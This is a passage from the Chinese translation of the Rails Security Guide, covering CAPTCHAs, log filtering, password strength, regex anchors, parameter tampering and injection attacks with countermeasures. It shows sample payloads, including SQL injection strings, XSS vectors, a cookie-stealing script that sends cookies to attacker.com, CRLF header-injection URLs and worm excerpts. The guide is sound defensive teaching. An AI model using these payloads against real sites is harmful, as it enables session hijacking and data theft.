TIP: 验证码是一种质询-响应测试，用于判断响应是否由计算机生成。验证码要求用户输入变形图片中的字符，以防恶意注册和发布垃圾评论。验证码又分为积极验证码和消极验证码。消极验证码的思路不是证明用户是人类，而是证明机器人是机器人。

[reCAPTCHA](https://www.google.com/recaptcha) 是一种流行的积极验证码 API，它会显示两张来自古籍的单词的变形图像，同时还添加了弯曲的中划线。相比之下，早期的验证码仅使用了扭曲的背景和高度变形的文本，所以后来被破解了。此外，使用 reCAPTCHA 同时是在为古籍数字化作贡献。和 reCAPTCHA API 同名的 [reCAPTCHA](https://github.com/ambethia/recaptcha/) 是一个 Rails 插件。

reCAPTCHA API 提供了公钥和私钥两个密钥，它们应该在 Rails 环境中设置。设置完成后，我们就可以在视图中使用 `recaptcha_tags` 方法，在控制器中使用 `verify_recaptcha` 方法。如果验证码验证失败，`verify_recaptcha` 方法返回 `false`。验证码的缺点是影响用户体验。并且对于视障用户，有些变形的验证码难以看清。尽管如此，积极验证码仍然是防止各种机器人提交表单的最有效的方法之一。

大多数机器人都很笨拙，它们在网上爬行，并在找到的每一个表单字段中填入垃圾信息。消极验证码正是利用了这一点，只要通过 JavaScript 或 CSS 在表单中添加隐藏的“蜜罐”字段，就能发现那些机器人。

注意，消极验证码只能有效防范笨拙的机器人，对于那些针对关键应用的专用机器人就力不从心了。不过，通过组合使用消极验证码和积极验证码，可以获得更好的性能表现。例如，如果“蜜罐”字段不为空（发现了机器人），再验证积极验码就没有必要了，从而避免了向 Google ReCaptcha 发起 HTTPS 请求。

通过 JavaScript 或 CSS 隐藏“蜜罐”字段有下面几种思路：

- 把字段置于页面的可见区域之外；

- 使元素非常小或使它们的颜色与页面背景相同；

- 仍然显示字段，但告诉用户不要填写。

最简单的消极验证码是一个隐藏的“蜜罐”字段。在服务器端，我们需要检查这个字段的值：如果包含任何文本，就说明请求来自机器人。然后，我们可以直接忽略机器人提交的表单数据。也可以提示保存成功但实际上并不写入数据库，这样被愚弄的机器人就会自动离开了。对于不受欢迎的用户，也可以采取类似措施。

Ned Batchelder 在[一篇博客文章](http://nedbatchelder.com/text/stopbots.html)中介绍了更复杂的消极验证码：

- 在表单中包含带有当前 UTC 时间戳的字段，并在服务器端检查这个字段。无论字段中的时间过早还是过晚，都说该明表单不合法；

- 随机生成字段名；

- 包含各种类型的多个“蜜罐”字段，包括提交按钮。

注意，消极验证码只能防范自动机器人，而不能防范专用机器人。因此，消极验证码并非保护登录表单的最佳方案。

### 日志

WARNING: 告诉 Rails 不要把密码写入日志。

默认情况下，Rails 会记录 Web 应用收到的所有请求。但是日志文件也可能成为巨大的安全隐患，因为其中可能包含登录的账号密码、信用卡号码等。当我们考虑 Web 应用的安全性时，我们应该设想攻击者完全获得 Web 服务器访问权限的情况。如果在日志文件中可以找到密钥和密码的明文，在数据库中对这些信息进行加密就变得毫无意义。在应用配置文件中，我们可以通过设置 `config.filter_parameters` 选项，指定写入日志时需要过滤的请求参数。在日志中，这些被过滤的参数会显示为 `[FILTERED]`。

```ruby
config.filter_parameters << :password
```

NOTE: 通过正则表达式，与配置中指定的参数部分匹配的所有参数都会被过滤掉。默认情况下，Rails 已经在初始化脚本（`initializers/filter_parameter_logging.rb`）中指定了 `:password` 参数，因此应用中常见的 `password` 和 `password_confirmation` 参数都会被过滤。

### 好的密码

TIP: 你是否发现，要想记住所有密码太难了？请不要因此把所有密码都完整地记下来，我们可以使用容易记住的句子中单词的首字母作为密码。

安全技术专家 Bruce Schneier 通过分析[后文](#真实案例)提到的 [MySpace 钓鱼攻击](http://www.schneier.com/blog/archives/2006/12/realworld_passw.html)中 34,000 个真实的用户名和密码，发现绝大多数密码非常容易破解。其中最常见的 20 个密码是：

    password1, abc123, myspace1, password, blink182, qwerty1, ****you, 123abc, baseball1, football1, 123456, soccer, monkey1, liverpool1, princess1, jordan23, slipknot1, superman1, iloveyou1, monkey

有趣的是，这些密码中只有 4% 是字典单词，绝大多数密码实际是由字母和数字组成的。不过，用于破解密码的字典中包含了大量目前常用的密码，而且攻击者还会尝试各种字母数字的组合。如果我们使用弱密码，一旦攻击者知道了我们的用户名，就能轻易破解我们的账户。

好的密码是混合使用大小写字母和数字的长密码。但这样的密码很难记住，因此我们可以使用容易记住的句子中单词的首字母作为密码。例如，“The quick brown fox jumps over the lazy dog”对应的密码是“Tqbfjotld”。当然，这里只是举个例子，实际在选择密码时不应该使用这样的名句，因为用于破解密码的字典中很可能包含了这些名句对应的密码。

### 正则表达式

TIP: 在使用 Ruby 的正则表达式时，一个常见错误是使用 `^` 和 `$` 分别匹配字符串的开头和结尾，实际上正确的做法是使用 `\A` 和 `\z`。

Ruby 的正则表达式匹配字符串开头和结尾的方式与很多其他语言略有不同。甚至很多 Ruby 和 Rails 的书籍都把这个问题搞错了。那么，为什么这个问题会造成安全威胁呢？让我们看一个例子。如果想要不太严谨地验证 URL 地址，我们可以使用下面这个简单的正则表达式：

```ruby
/^https?:\/\/[^\n]+$/i
```

这个正则表达式在某些语言中可以正常工作，但在 Ruby 中，`^` 和 `$` 分别匹配行首和行尾，因此下面这个 URL 能够顺利通过验证：

```javascript
javascript:exploit_code();/*
http://hi.com
*/
```

之所以能通过验证，是因为用于验证的正则表达式匹配了这个 URL 的第二行，因而不会再验证其他两行。假设我们在视图中像下面这样显示 URL：

```ruby
link_to "Homepage", @user.homepage
```

这个链接看起来对访问者无害，但只要一点击，就会执行 `exploit_code` 这个 JavaScript 函数或攻击者提供的其他 JavaScript 代码。

要想修正这个正则表达式，我们可以用 `\A` 和 `\z` 分别代替 `^` 和 `$`，即：

```ruby
/\Ahttps?:\/\/[^\n]+\z/i
```

由于这是一个常见错误，Rails 已经采取了预防措施，如果提供的正则表达式以 `^` 开头或以 `$` 结尾，格式验证器（`validates_format_of`）就会抛出异常。如果确实需要用 `^` 和 `$` 代替 `\A` 和 `\z`（这种情况很少见），我们可以把 `:multiline` 选项设置为 `true`，例如：

```ruby
# content 字符串应包含“Meanwhile”这样一行
validates :content, format: { with: /^Meanwhile$/, multiline: true }
```

注意，这种方式只能防止格式验证中的常见错误，在 Ruby 中，我们需要时刻记住，`^` 和 `$` 分别匹配行首和行尾，而不是整个字符串的开头和结尾。

### 提升权限

WARNING: 只需纂改一个参数，就有可能使用户获得未经授权的权限。记住，不管我们如何隐藏或混淆，每一个参数都有可能被纂改。

用户最常篡改的参数是 ID，例如在 `http://www.domain.com/project/1` 这个 URL 地址中，ID 是 `1`。在控制器中可以通过 `params` 得到这个 ID，通常的操作如下：

```ruby
@project = Project.find(params[:id])
```

对于某些 Web 应用，这样做没问题。但如果用户不具有查看所有项目的权限，就不能这样做。否则，如果某个用户把 URL 地址中的 ID 改为 `42`，并且该用户没有查看这个项目的权限，结果却仍然能够查看项目。为此，我们需要同时查询用户的访问权限：

```ruby
@project = @current_user.projects.find(params[:id])
```

对于不同的 Web 应用，用户能够纂改的参数也不同。根据经验，未经验证的用户输入都是不安全的，来自用户的参数都有被纂改的潜在风险。

通过混淆参数或 JavaScript 来实现安全性一点儿也不可靠。通过 Mozilla Firefox 的 Web 开发者工具栏，我们可以查看和修改表单的隐藏字段。JavaScript 常用于验证用户输入的数据，但无法防止攻击者发送带有不合法数据的恶意请求。Mozilla Firefox 的 Live Http Headers 插件，可以记录每次请求，而且可以重复发起并修改这些请求，这样就能轻易绕过 JavaScript 验证。还有一些客户端代理，允许拦截进出的任何网络请求和响应。

注入攻击
--------

TIP: 注入这种攻击方式，会把恶意代码或参数写入 Web 应用，以便在应用的安全上下文中执行。注入攻击最著名的例子是跨站脚本（XSS）和 SQL 注入攻击。

注入攻击非常复杂，因为相同的代码或参数，在一个上下文中可能是恶意的，但在另一个上下文中可能完全无害。这里的上下文指的是脚本、查询或编程语言，Shell 或 Ruby/Rails 方法等等。下面几节将介绍可能发生注入攻击的所有重要场景。不过第一节我们首先要介绍，面对注入攻击时如何进行综合决策。

### 白名单 vs 黑名单

NOTE: 对于净化、保护和验证操作，白名单优于黑名单。

黑名单可以包含垃圾电子邮件地址、非公开的控制器动作、造成安全威胁的 HTML 标签等等。与此相反，白名单可以包含可靠的电子邮件地址、公开的控制器动作、安全的 HTML 标签等等。尽管有些情况下我们无法创建白名单（例如在垃圾信息过滤器中），但只要有可能就应该优先使用白名单：

- 对于安全相关的控制器动作，在 `before_action` 选项中用 `except: […​]` 代替 `only: […​]`，这样就不会忘记为新建动作启用安全检查；

- 为防止跨站脚本（XSS）攻击，应允许使用 `<strong>` 标签，而不是去掉 `<script>` 标签，详情请参阅后文；

- 不要尝试通过黑名单来修正用户输入：

    -   否则攻击者可以发起 `"<sc<script>ript>".gsub("<script>", "")` 这样的攻击；

    -   对于非法输入，直接拒绝即可。

使用黑名单时有可能因为人为因素造成遗漏，使用白名单则能有效避免这种情况。

### SQL 注入

TIP: Rails 为我们提供的方法足够智能，绝大多数情况下都能防止 SQL 注入。但对 Web 应用而言，SQL 注入是常见并具有毁灭性的攻击方式，因此了解这种攻击方式十分重要。

#### 简介

SQL 注入攻击的原理是，通过纂改传入 Web 应用的参数来影响数据库查询。SQL 注入攻击的一个常见目标是绕过授权，另一个常见目标是执行数据操作或读取任意数据。下面的例子说明了为什么要避免在查询中使用用户输入的数据：

```ruby
Project.where("name = '#{params[:name]}'")
```

这个查询可能出现在搜索动作中，用户会输入想要查找的项目名称。如果恶意用户输入 `' OR 1 --`，将会生成下面的 SQL 查询：

```sql
SELECT * FROM projects WHERE name = '' OR 1 --'
```

其中 `--` 表示注释开始，之后的所有内容都会被忽略。执行这个查询后，将返回项目数据表中的所有记录，也包括当前用户不应该看到的记录，原因是所有记录都满足查询条件。

#### 绕过授权

通常 Web 应用都包含访问控制。用户输入登录的账号密码，Web 应用会尝试在用户数据表中查找匹配的记录。如果找到了，应用就会授权用户登录。但是，攻击者通过 SQL 注入，有可能绕过这项检查。下面的例子是 Rails 中一个常见的数据库查询，用于在用户数据表中查找和用户输入的账号密码相匹配的第一条记录。

```ruby
User.first("login = '#{params[:name]}' AND password = '#{params[:password]}'")
```

如果攻击者输入 `' OR '1'='1` 作为用户名，输入 `' OR '2'>'1` 作为密码，将会生成下面的 SQL 查询：

```sql
SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'>'1' LIMIT 1
```

执行这个查询后，会返回用户数据表的第一条记录，并授权用户登录。

#### 未经授权读取数据

UNION 语句用于连接两个 SQL 查询，并以集合的形式返回查询结果。攻击者利用 UNION 语句，可以从数据库中读取任意数据。还以前文的这个例子来说明：

```ruby
Project.where("name = '#{params[:name]}'")
```

通过 UNION 语句，攻击者可以注入另一个查询：

    ') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --

结果会生成下面的 SQL 查询：

```sql
SELECT * FROM projects WHERE (name = '') UNION
  SELECT id,login AS name,password AS description,1,1,1 FROM users --'
```

执行这个查询得到的结果不是项目列表（因为不存在名称为空的项目），而是用户名密码的列表。如果发生这种情况，我们只能祈祷数据库中的用户密码都加密了！攻击者需要解决的唯一问题是，两个查询中字段的数量必须相等，本例中第二个查询中的多个 1 正是为了解决这个问题。

此外，第二个查询还通过 `AS` 语句对某些字段进行了重命名，这样 Web 应用就会显示从用户数据表中查询到的数据。出于安全考虑，请把 Rails 升级至 [2.1.1 或更高版本](http://www.rorsecurity.info/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter/)。

#### 对策

Ruby on Rails 内置了针对特殊 SQL 字符的过滤器，用于转义 `'`、`"`、`NULL` 和换行符。当我们使用 `Model.find(id)` 和 `Model.find_by_something(something)` 方法时，Rails 会自动应用这个过滤器。但在 SQL 片段中，尤其是在条件片段（`where("…​")`）中，需要为 `connection.execute()` 和 `Model.find_by_sql()` 方法手动应用这个过滤器。

为了净化受污染的字符串，在提供查询条件的选项时，我们应该传入数组而不是直接传入字符串：

```ruby
Model.where("login = ? AND password = ?", entered_user_name, entered_password).first
```

如上所示，数组的第一个元素是包含问号的 SQL 片段，从第二个元素开始都是需要净化的变量，净化后的变量值将用于代替 SQL 片段中的问号。我们也可以传入散列来实现相同效果：

```ruby
Model.where(login: entered_user_name, password: entered_password).first
```

只有在模型实例上，才能通过数组或散列指定查询条件。对于其他情况，我们可以使用 `sanitize_sql()` 方法。遇到需要在 SQL 中使用外部字符串的情况时，请养成考虑安全问题的习惯。

### 跨站脚本（XSS）

TIP: 对 Web 应用而言，XSS 是影响范围最广、破坏性最大的安全漏洞。这种恶意攻击方式会在客户端注入可执行代码。Rails 提供了防御这种攻击的辅助方法。

#### 切入点

存在安全风险的 URL 及其参数，是攻击者发动攻击的切入点。

最常见的切入点包括帖子、用户评论和留言本，但项目名称、文档名称和搜索结果同样存在安全风险，实际上凡是用户能够输入信息的地方都存在安全风险。而且，输入不仅来自网站上的输入框，也可能来自 URL 参数（公开参数、隐藏参数或内部参数）。记住，用户有可能拦截任何通信。通过 [Firefox 的 Live HTTP Headers 插件](http://livehttpheaders.mozdev.org/)这样的工具或者客户端代理，用户可以轻易修改请求数据。

XSS 攻击的工作原理是：攻击者注入代码，Web 应用保存并在页面中显示这些代码，受害者访问包含恶意代码的页面。本文给出的 XSS 示例大多数只是显示一个警告框，但 XSS 的威力实际上要大得多。XSS 可以窃取 cookie、劫持会话、把受害者重定向到假冒网站、植入攻击者的赚钱广告、纂改网站元素以窃取登录用户名和密码，以及通过 Web 浏览器的安全漏洞安装恶意软件。

仅 2007 年下半年，在 Mozilla 浏览器中就发现了 88 个安全漏洞，Safari 浏览器 22 个， IE 浏览器 18个， Opera 浏览器 12个。[赛门铁克《互联网安全威胁报告》](http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf)指出，仅 2007 年下半年，在浏览器插件中就发现了 239 个安全漏洞。[Mpack](http://pandalabs.pandasecurity.com/mpack-uncovered/) 这个攻击框架非常活跃、经常更新，其作用是利用这些漏洞发起攻击。对于那些从事网络犯罪的黑客而言，利用 Web 应用框架中的 SQL 注入漏洞，在数据表的每个文本字段中插入恶意代码是非常有吸引力的。2008 年 4 月，超过 51 万个网站遭到了这类攻击，其中包括英国政府、联合国和其他一些重要网站。

横幅广告是相对较新、不太常见的切入点。[趋势科技](http://blog.trendmicro.com/myspace-excite-and-blick-serve-up-malicious-banner-ads/)指出，2008年早些时候，在流行网站（如 MySpace 和 Excite）的横幅广告中出现了恶意代码。

#### HTML / JavaScript 注入

XSS 最常用的语言非 JavaScript （最受欢迎的客户端脚本语言）莫属，并且经常与 HTML 结合使用。因此，对用户输入进行转义是必不可少的安全措施。

让我们看一个 XSS 的例子：

```html
<script>alert('Hello');</script>
```

这行 JavaScript 代码仅仅显示一个警告框。下面的例子作用完全相同，只不过其用法不太常见：

```html
<img src=javascript:alert('Hello')>
<table background="javascript:alert('Hello')">
```

##### 窃取 cookie

到目前为止，本文给出的几个例子都不会造成实际危害，接下来，我们要看看攻击者如何窃取用户的 cookie（进而劫持用户会话）。在 JavaScript 中，可以使用 `document.cookie` 属性来读写文档的 cookie。JavaScript 遵循同源原则，这意味着一个域名上的脚本无法访问另一个域名上的 cookie。`document.cookie` 属性中保存的是相同域名 Web 服务器上的 cookie，但只要把代码直接嵌入 HTML 文档（就像 XSS 所做的那样），就可以读写这个属性了。把下面的代码注入自己的 Web 应用的任何页面，我们就可以看到自己的 cookie：

```html
<script>document.write(document.cookie);</script>
```

当然，这样的做法对攻击者来说并没有意义，因为这只会让受害者看到自己的 cookie。在接下来的例子中，我们会尝试从 http://www.attacker.com/ 这个 URL 地址加载图像和 cookie。当然，因为这个 URL 地址并不存在，所以浏览器什么也不会显示。但攻击者能够通过这种方式，查看 Web 服务器的访问日志文件，从而看到受害者的 cookie。

```html
<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
```

www.attacker.com 的日志文件中将出现类似这样的一条记录：

    GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2

在 cookie 中添加 `httpOnly` 标志可以规避这种攻击，这个标志可以禁止 JavaScript 读取 `document.cookie` 属性。IE v6.SP1、 Firefox v2.0.0.5 和 Opera 9.5 以及更高版本的浏览器都支持 `httpOnly` 标志，Safari 浏览器也在考虑支持这个标志。但其他浏览器（如 WebTV）或旧版浏览器（如 Mac 版 IE 5.5）不支持这个标志，因此遇到上述攻击时会导致网页无法加载。需要注意的是，即便设置了 `httpOnly` 标志，通过 [Ajax](https://www.owasp.org/index.php/HTTPOnly#Browsers_Supporting_HttpOnly) 仍然可以读取 cookie。

##### 涂改信息

通过涂改网页信息，攻击者可以做很多事情，例如，显示虚假信息，或者诱使受害者访问攻击者的网站以窃取受害者的 cookie、登录用户名和密码或其他敏感信息。最常见的信息涂改方式是通过 iframe 加载外部代码：

```html
<iframe name="StatPage" src="http://58.xx.xxx.xxx" width=5 height=5 style="display:none"></iframe>
```

这行代码可以从外部网站加载任何 HTML 和 JavaScript 代码并嵌入当前网站，来自黑客使用 [Mpack 攻击框架](http://isc.sans.org/diary.html?storyid=3015)攻击某个意大利网站的真实案例。Mpack 会尝试利用 Web 浏览器的安全漏洞安装恶意软件，成功率高达 50%。

更专业的攻击可以覆盖整个网站，也可以显示一个和原网站看起来一模一样的表单，并把受害者的用户名密码发送到攻击者的网站，还可以使用 CSS 和 JavaScript 隐藏原网站的正常链接并显示另一个链接，把用户重定向到假冒网站上。

反射式注入攻击不需要储存恶意代码并将其显示给用户，而是直接把恶意代码包含在 URL 地址中。当搜索表单无法转义搜索字符串时，特别容易发起这种攻击。例如，访问下面这个链接，打开的页面会显示，“乔治·布什任命一名 9 岁男孩担任议长……”：[1]

    http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1-->
      <script src=http://www.securitylab.ru/test/sc.js></script><!--

##### 对策

TIP: 过滤恶意输入非常重要，但是转义 Web 应用的输出同样也很重要。

尤其对于 XSS，重要的是使用白名单而不是黑名单过滤输入。白名单过滤规定允许输入的值，反之，黑名单过滤规定不允许输入的值。经验告诉我们，黑名单永远做不到万无一失。

假设我们通过黑名单从用户输入中删除 `script`，如果攻击者注入 `<scrscriptipt>`，过滤后就能得到 `<script>`。Rails 的早期版本在 `strip_tags()`、`strip_links()` 和 `sanitize()` 方法中使用了黑名单，因此有可能受到下面这样的注入攻击：

```ruby
strip_tags("some<<b>script>alert('hello')<</b>/script>")
```

这行代码会返回 `some<script>alert('hello')</script>`，也就是说攻击者可以发起注入攻击。这个例子说明了为什么白名单比黑名单更好。Rails 2 及更高版本中使用了白名单，下面是使用新版 `sanitize()` 方法的例子：

```ruby
tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
s = sanitize(user_input, tags: tags, attributes: %w(href title))
```

通过规定允许使用的标签，`sanitize()` 完美地完成了过滤输入的任务。不管攻击者使出什么样的花招、设计出多么畸型的标签，都难逃被过滤的命运。

接下来应该转义应用的所有输出，特别是在需要显示未经过滤的用户输入时（例如前面提到的的搜索表单的例子）。使用 `escapeHTML()` 方法（或其别名 `h()` 方法），把 HTML 中的字符 `&`、`"`、`<` 和 `>` 替换为对应的转义字符 `&amp;`、`&quot;`、`&lt;` 和 `&gt;`。然而作为程序员，我们往往很容易忘记这项工作，因此推荐使用 `SafeErb` 这个 gem，它会提醒我们转义来自外部的字符串。

##### 混淆和编码注入

早先的网络流量主要基于有限的西文字符，后来为了传输其他语言的字符，出现了新的字符编码，例如 Unicode。这也给 Web 应用带来了安全威胁，因为恶意代码可以隐藏在不同的字符编码中。Web 浏览器通常可以处理不同的字符编码，但 Web 应用往往不行。下面是通过 UTF-8 编码发动攻击的例子：

```html
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
  &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
```

上述代码运行后会弹出一个消息框。不过，前面提到的 `sanitize()` 过滤器能够识别此类代码。[Hackvertor](https://hackvertor.co.uk/public) 是用于字符串混淆和编码的优秀工具，了解这个工具可以帮助我们知己知彼。Rails 提供的 `sanitize()` 方法能够有效防御编码注入攻击。

##### 真实案例

TIP: 为了了解当前针对 Web 应用的攻击方式，最好看几个真实案例。

下面的代码摘录自 [Js.Yamanner@m](http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&tabid=1) 制作的雅虎邮件[蠕虫](http://groovin.net/stuff/yammer.txt)。该蠕虫出现于 2006 年 6 月 11 日，是首个针对网页邮箱的蠕虫：

    <img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
      target=""onload="var http_request = false;    var Email = '';
      var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...

该蠕虫利用了雅虎 HTML/JavaScript 过滤器的漏洞，这个过滤器用于过滤 HTML 标签中的所有 `target` 和 `onload` 属性（原因是这两个属性的值可以是 JavaScript）。因为这个过滤器只会执行一次，上述例子中 `onload` 属性中的蠕虫代码并没有被过滤掉。这个例子很好地诠释了黑名单永远做不到万无一失，也说明了 Web 应用为什么通常都会禁止输入 HTML/JavaScript。

另一个用于概念验证的网页邮箱蠕虫是 Ndjua，这是一个针对四个意大利网页邮箱服务的跨域名蠕虫。更多介绍请阅读 [Rosario Valotta 的论文](http://www.xssed.com/news/37/Nduja_Connection_A_cross_webmail_worm_XWW/)。刚刚介绍的这两个蠕虫，其目的都是为了搜集电子邮件地址，一些从事网络犯罪的黑客可以利用这些邮件地址获取非法收益。

2006 年 12 月，在一次[针对 MySpace 的钓鱼攻击](http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html)中，黑客窃取了 34,000 个真实用户名和密码。这次攻击的原理是，创建名为“login\_home\_index\_html”的个人信息页面，并使其 URL 地址看起来十分正常，同时通过精心设计的 HTML 和 CSS，隐藏 MySpace 的真正内容，并显示攻击者创建的登录表单。

### CSS 注入

TIP: CSS 注入实际上是 JavaScript 注入，因为有的浏览器（如 IE、某些版本的 Safari 和其他浏览器）允许在 CSS 中使用 JavaScript。因此，在允许 Web 应用使用自定义 CSS 时，请三思而后行。

著名的 [MySpace Samy 蠕虫](http://namb.la/popular/tech.html)是解释 CSS 注入攻击原理的最好例子。这个蠕虫只需访问用户的个人信息页面就能向 Samy（攻击者）发送好友请求。在短短几个小时内，Samy 就收到了超过一百万个好友请求，巨大的流量致使 MySpace 宕机。下面我们从技术角度来分析这个蠕虫。

MySpace 禁用了很多标签，但允许使用 CSS。因此，蠕虫的作者通过下面这种方式把 JavaScript 值入 CSS 中：

```html
<div style="background:url('javascript:alert(1)')">
```

这样 `style` 属性就成为了恶意代码。在这段恶意代码中，不允许使用单引号和多引号，因为这两种引号都已经使用了。但是在 JavaScript 中有一个好用的 `eval()` 函数，可以把任意字符串作为代码来执行。

```html
<div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')">
```

`eval()` 函数是黑名单输入过滤器的噩梦，它使 `innerHTML` 这个词得以藏身 `style` 属性之中：

```javascript
alert(eval('document.body.inne' + 'rHTML'));
```

下一个问题是，MySpace 会过滤 `javascript` 这个词，因此作者使用 `java<NEWLINE>script` 来绕过这一限制：

```html
<div id="mycode" expr="alert('hah!')" style="background:url('java↵ 
script:eval(document.all.mycode.expr)')">
```

[CSRF 安全令牌](#跨站请求伪造（CSRF）)是蠕虫作者面对的另一个问题。如果没有令牌，就无法通过 POST 发送好友请求。解决方案是，在添加好友前先向用户的个人信息页面发送 GET 请求，然后分析返回结果以获取令牌。

最后，蠕虫作者完成了一个大小为 4KB 的蠕虫，他把这个蠕虫注入了自己的个人信息页而。

对于 Gecko 内核的浏览器（例如 Firefox），[moz-binding](http://www.securiteam.com/securitynews/5LP051FHPE.html) CSS 属性也已被证明可用于把 JavaScript 植入 CSS 中。

#### 对策

这个例子再次说明，黑名单永远做不到万无一失。不过，在 Web 应用中使用自定义 CSS 是一个非常罕见的特性，为这个特性编写好用的 CSS 白名单过滤器可能会很难。如果想要允许用户自定义颜色或图片，我们可以让用户在 Web 应用中选择所需的颜色或图片，然后自动生成对应的 CSS。如果确实需要编写 CSS 白名单过滤器，可以参照 Rails 提供的 `sanitize()` 进行设计。

### Textile 注入

基于安全考虑，我们可能想要用其他文本格式（标记语言）来代替 HTML，然后在服务器端把所使用的标记语言转换为 HTML。[RedCloth](http://redcloth.org/) 是一种可以在 Ruby 中使用的标记语言，但在不采取预防措施的情况下，这种标记语言同样存在受到 XSS 攻击的风险。

例如，RedCloth 会把 `_test_` 转换为 `<em>test</em>`，显示为斜体。但直到最新的 3.0.4 版，这一特性都存在受到 XSS 攻击的风险。全新的第 4 版已经移除了这一严重的安全漏洞。然而即便是第 4 版也存在[一些安全漏洞](http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html)，仍有必要采取预防措施。下面给出了针对 3.0.4 版的例子：

```ruby
RedCloth.new('<script>alert(1)</script>').to_html
# => "<script>alert(1)</script>"
```

使用 `:filter_html` 选项可以移除并非由 Textile 处理器创建的 HTML：

```ruby
RedCloth.new('<script>alert(1)</script>', [:filter_html]).to_html
# => "alert(1)"
```

不过，这个选项不会过滤所有的 HTML，RedCloth 的作者在设计时有意保留了一些标签，例如 `<a>`：

```ruby
RedCloth.new("<a href='javascript:alert(1)'>hello</a>", [:filter_html]).to_html
# => "<p><a href="javascript:alert(1)">hello</a></p>"
```

#### 对策

建议将 RedCloth 和白名单输入过滤器结合使用，具体操作请参考 [对策](#对策)。

### Ajax 注入

NOTE: 对于 Ajax 动作，必须采取和常规控制器动作一样的安全预防措施。不过，至少存在一个例外：如果动作不需要渲染视图，那么在控制器中就应该进行转义。

如果使用了 [in\_place\_editor](https://rubygems.org/gems/in_place_editing) 插件，或者控制器动作只返回字符串而不渲染视图，我们就应该在动作中转义返回值。否则，一旦返回值中包含 XSS 字符串，这些恶意代码就会在发送到浏览器时执行。请使用 `h()` 方法对所有输入值进行转义。

### 命令行注入

NOTE: 请谨慎使用用户提供的命令行参数。

如果应用需要在底层操作系统中执行命令，可以使用 Ruby 提供的几个方法：`exec(command)`、`syscall(command)`、`system(command)` 和 `command`。如果整条命令或命令的某一部分是由用户输入的，我们就必须特别小心。这是因为在大多数 Shell 中，可以通过分号（`;`）或竖线（`|`）把几条命令连接起来，这些命令会按顺序执行。

为了防止这种情况，我们可以使用 `system(command, parameters)` 方法，通过这种方式传递命令行参数更安全。

```ruby
system("/bin/echo","hello; rm *")
# 打印 "hello; rm *" 而不会删除文件
```

### 首部注入

WARNING: HTTP 首部是动态生成的，因此在某些情况下可能会包含用户注入的信息，从而导致错误重定向、XSS 或 HTTP 响应拆分（HTTP response splitting）。

HTTP 请求首部中包含 Referer、User-Agent（客户端软件）和 Cookie 等字段；响应首部中包含状态码、Cookie 和 Location（重定向目标 URL）等字段。这些字段都是由用户提供的，用户可以想办法修改。因此，别忘了转义这些首部字段，例如在管理页面中显示 User-Agent 时。

除此之外，在部分基于用户输入创建响应首部时，知道自己在做什么很重要。例如，为表单添加 `referer` 字段，由用户指定 URL 地址，以便把用户重定向到指定页面：

```ruby
redirect_to params[:referer]
```

这行代码告诉 Rails 把用户提供的地址字符串放入首部的 `Location` 字段，并向浏览器发送 302（重定向）状态码。于是，恶意用户可以这样做：

    http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld

由于 Rails 2.1.2 之前的版本有缺陷，黑客可以在首部中注入任意字段，例如：

    http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
    http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld

注意，`%0d%0a` 是 URL 编码后的 `\r\n`，也就是 Ruby 中的回车换行符（CRLF）。因此，上述第二个例子得到的 HTTP 首部如下（第二个 Location 覆盖了第一个 Location）：

    HTTP/1.1 302 Moved Temporarily
    (...)
    Location: http://www.malicious.tld

通过这些例子我们看到，首部注入攻击的原理是在首部字段中注入回车换行符。通过错误重定向，攻击者可以把用户重定向到钓鱼网站，在一个和正常网站看起来完全一样的页面中要求用户再次登录，从而窃取登录的用户名密码。攻击者还可以通过浏览器安全漏洞安装恶意软件。Rails 2.1.2 的 `redirect_to` 方法对 Location 字段的值做了转义。当我们使用用户输入创建其他首部字段时，需要手动转义。

#### 响应拆分

既然存在首部注入的可能性，自然也存在响应拆分的可能性。在 HTTP 响应中，首部之后是两个回车换行符，然后是真正的数据（通常是 HTML）。响应拆分的工作原理是，在首部中插入两个回车换行符，之后紧跟带有恶意 HTML 代码的另一个响应。这样，响应就变为：

    HTTP/1.1 302 Found [First standard 302 response]
    Date: Tue, 12 Apr 2005 22:09:07 GMT
    Location: Content-Type: text/html


    HTTP/1.1 200 OK [Second New response created by attacker begins]
    Content-Type: text/html


    &lt;html&gt;&lt;font color=red&gt;hey&lt;/font&gt;&lt;/html&gt; [Arbitrary malicious input is
    Keep-Alive: timeout=15, max=100         shown as the redirected page]
    Connection: Keep-Alive
    Transfer-Encoding: chunked
    Content-Type: text/html

在某些情况下，受到响应拆分攻击后，受害者接收到的是恶意 HTML 代码。不过，这种情况只会在保持活动（Keep-Alive）的连接中发生，而很多浏览器都使用一次性连接。当然，我们不能指望通过浏览器的特性来防御这种攻击。这是一个严重的安全漏洞，正确的做法是把 Rails 升级到 2.0.5 和 2.1.2 及更高版本，这样才能消除首部注入（和响应拆分）的风险。

生成不安全的查询
----------------

